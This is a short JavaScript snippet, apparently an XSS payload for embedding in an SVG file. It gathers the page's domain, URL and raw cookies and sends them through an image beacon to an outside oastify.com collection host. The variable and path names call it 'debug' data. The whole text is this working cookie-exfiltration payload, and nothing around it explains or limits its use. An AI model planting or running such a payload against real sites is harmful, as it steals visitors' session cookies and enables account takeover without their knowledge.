svg.script:
const debugData = encodeURIComponent(JSON.stringify({
  timestamp: new Date().toISOString(),
  pageDomain: document.domain,
  pageURL: location.href,
  cookieRaw: document.cookie,
  cookieLength: document.cookie.length,
  cookieTest: document.cookie === ''
}));

// Image beacon - always works, no CORS issues
new Image().src = 'https://vhgkbwniokbfy8qyl2ohjmjfu60xorcg.oastify.com/debug?data=' + debugData;
